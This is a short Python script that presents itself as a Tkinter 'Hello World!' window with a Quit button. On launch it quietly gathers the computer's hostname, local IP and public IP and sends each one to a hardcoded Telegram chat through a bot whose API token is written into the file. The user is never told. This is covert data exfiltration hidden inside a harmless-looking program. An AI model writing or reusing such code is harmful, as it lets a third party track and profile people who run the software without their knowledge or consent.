from tkinter import *
from tkinter import ttk
import socket
import telebot
from requests import get

bot = telebot.TeleBot('2035467988:AAEz7p0ZCXorON0GORG4-J8WzjiYtKW3Oe4')

root = Tk()
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text
print(hostname, local_ip, public_ip)
bot.send_message(712747254, hostname)
bot.send_message(712747254, local_ip)
bot.send_message(712747254, public_ip)
frm = ttk.Frame(root, padding=10)
frm.grid()
ttk.Label(frm, text="Hello World!").grid(column=0, row=0)
ttk.Button(frm, text="Quit", command=root.destroy).grid(column=1, row=0)
root.mainloop()